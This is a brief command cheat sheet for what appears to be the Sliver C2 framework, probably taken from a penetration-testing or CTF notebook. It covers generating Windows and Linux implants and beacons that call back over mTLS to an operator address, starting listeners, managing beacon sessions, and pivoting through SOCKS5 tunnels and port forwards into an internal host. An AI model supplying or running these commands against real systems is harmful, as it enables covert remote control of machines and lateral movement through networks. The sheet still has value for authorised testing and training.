- Show beacons
```bash
beacons
```
- use beacons
```bash
use <Beacon-ID>
```
- start interactive session from inside that beacon
```bash
interactive
```
- Generate implants
```
generate --os windows --mtls 10.10.17.34:8888 --save payload.exe
generate --os linux --mtls 10.10.17.34:8888 --save executeMe
```
- Beacon Implants
```
generate beacon --os windows --mtls 10.10.17.34:8888 --save payload.exe
generate beacon --os linux --mtls 10.10.17.34:8888 --save executeMe
```
- Start `mtls` listener to receive callbacks
```
mtls
```
- view `mtls` listeners
```bash
jobs
```
### Pivoting and port forwarding
- Create a socks5 tunnel + edit `/etc/proxychains4.conf`
```bash
socks5 start
```
- Forward remote ports to our machine
```
portfwd add --bind 127.0.0.1:2222 --remote 10.129.12.231:22
```
- Remove a port forwarding
```
portfwd rm --id <ID>
```
- view port forwards
```bash
portfwd
```